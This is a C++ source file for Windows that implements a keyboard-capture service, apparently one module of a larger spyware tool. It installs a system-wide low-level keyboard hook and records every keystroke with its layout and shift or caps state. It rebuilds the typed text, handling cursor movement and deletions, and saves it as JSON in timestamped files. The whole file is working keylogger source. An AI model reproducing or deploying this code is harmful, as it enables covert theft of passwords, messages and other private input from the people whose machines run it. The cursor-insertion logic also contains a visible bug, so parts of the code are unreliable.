#include "services.hpp"
#if KEYBOARD_SERVICE

void services::keyboard::run()
{
	// Exit function if service is already running
	if (isRunning)
	{
		return;
	}

	isRunning = true;
	clear();

	if (hhkLowLevelKybd == NULL)
	{
		hhkLowLevelKybd = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, NULL);
	}

	vkQueueThread = std::thread(processqueue);
}

void services::keyboard::stop()
{
	if (!isRunning)
	{
		return;
	}

	isRunning = false;
	vkQueueThread.join();

	if (hhkLowLevelKybd != NULL)
	{
		UnhookWindowsHookEx(hhkLowLevelKybd);
		hhkLowLevelKybd = NULL;
	}
}


void services::keyboard::processqueue()
{
	while (isRunning)
	{
		if (!vkQueue.empty())
		{
			VirtualKeyInfo vkInfo = vkQueue.front();
			vkQueue.pop();

			switch (vkInfo.vkCode)
			{
			case VK_BACK:
				onBackspace();
				break;
			case VK_DELETE:
				onDelete();
				break;
			case VK_UP:
				// Point cursor to the start
				vkListCursor = vkListCursorBegin;
				break;
			case VK_DOWN:
				// Point cursor to the end
				vkListCursor = vkList.size();
				break;
			case VK_LEFT:
				// Shift virtual-key cursor to left if cursor isn't at begining
				if (vkListCursor > vkListCursorBegin)
				{
					vkListCursor--;
				}
				break;
			case VK_RIGHT:
				// Shift virtual-key cursor to right if cursor isn't at end
				if (vkListCursor < vkList.size())
				{
					vkListCursor++;
				}
				break;
			}

			processvk(vkInfo);
		}
		Sleep(50);
	}
}

LRESULT CALLBACK services::keyboard::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (wParam == WM_KEYDOWN)
	{
		KBDLLHOOKSTRUCT* dllHookStruct = (KBDLLHOOKSTRUCT*)lParam;

		bool isShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
		bool isCapsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

		VirtualKeyInfo vkInfo;
		vkInfo.vkCode = dllHookStruct->vkCode;
		vkInfo.lang = WORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
		vkInfo.flags = isShift && isCapsLock ? 0x3 : isShift ? 0x1 : isCapsLock ? 0x2 : 0x0;

		vkQueue.push(vkInfo);
	}

	return CallNextHookEx(hhkLowLevelKybd, nCode, wParam, lParam);
}

void services::keyboard::processvk(VirtualKeyInfo vkInfo)
{
	// Filter virtual-key repeats
	if (vkcmp(vkInfo, lastKeyPressed))
	{
		if (vkRepeats != KEYBOARD_MAX_REPEATS)
		{
			vkRepeats++;
		}
		else
		{
			return;
		}
	}
	else
	{
		vkRepeats = 0;
		lastKeyPressed = vkInfo;
	}

	if (isprintable(vkInfo.vkCode))
	{
		VirtualKeyInfoList::iterator it = vkList.begin();
		std::advance(vkList.begin(), vkListCursor);

		// Insert virtual-key into vkList at cursor position
		vkList.insert(it, vkInfo);

		vkEvents++;

		if (vkEvents == KEYBOARD_KEYS_TO_SAVE)
		{
			save();
		}
	}
}

void services::keyboard::save()
{
	// Json serialize virtual-key code list
	std::stringstream json;
	VirtualKeyInfo vkTemp;
	bool isFirst = true;
	json << "{\"vkl\":[";
	for (VirtualKeyInfoList::iterator it = vkList.begin(); it != vkList.end(); ++it)
	{
		vkTemp = static_cast<VirtualKeyInfo>(*it);
		if (!isFirst)
		{
			json << ',';
		}
		else
		{
			isFirst = false;
		}
		json << "{\"vk\":" << vkTemp.vkCode << ",\"la\":" << vkTemp.lang << ",\"fl\":" << vkTemp.flags << "}";
	}
	json << "]}";
	std::string result = json.str();

	// Create directory for keyboard data if not exist
	if (!io::directory::exist(dir))
	{
		io::directory::create(dir);
	}

	// Generate filename by time
	std::stringstream filename;
	filename << dir << "\\" << tools::getTime(tools::TimeFormat::file) << ".dat";

	// Write json-formated keyboard data to file
	io::file::write(filename.str(), result);

	// Prepare buffer to next virtual-key sequence
	vkListCursorBegin = 0;
	vkListCursor = 0;
	vkEvents = 0;
	vkList.clear();
}

void services::keyboard::onDelete()
{
	if (vkListCursor >= vkListCursorBegin && vkListCursor < vkList.size())
	{
		VirtualKeyInfoList::iterator it = vkList.begin();
		std::advance(it, vkListCursor);
		vkList.erase(it);
	}
}

void services::keyboard::onBackspace()
{
	if (vkListCursor > vkListCursorBegin && vkListCursor < vkList.size() + 1)
	{
		VirtualKeyInfoList::iterator it = vkList.begin();
		std::advance(it, vkListCursor - 1);
		vkList.erase(it);
		vkListCursor--;
	}
}

void services::keyboard::clear()
{
	vkEvents = 0;
	vkRepeats = 0;
	vkListCursorBegin = 0;
	vkListCursor = 0;
	lastKeyPressed.vkCode = 0;
	lastKeyPressed.lang = 0;
	lastKeyPressed.flags = 0;
	vkList.clear();
}

// Copmares two VirtualKeyInfo structures
inline bool services::keyboard::vkcmp(const VirtualKeyInfo vk1, const VirtualKeyInfo vk2)
{
	return (vk1.vkCode == vk2.vkCode && vk1.lang == vk2.lang && vk1.flags == vk2.flags);
}

// Is virtual key appends text into text fields
inline bool services::keyboard::isprintable(const DWORD vkCode)
{
	return (vkCode == VK_SPACE) // Nuff said
		|| (vkCode >= 0x30 && vkCode <= 0x5A) // 0 - 9, A - Z
		|| (vkCode >= 0x60 && vkCode <= 0x6F);// Numpad keys
}

#endif // KEYBOARD_SERVICE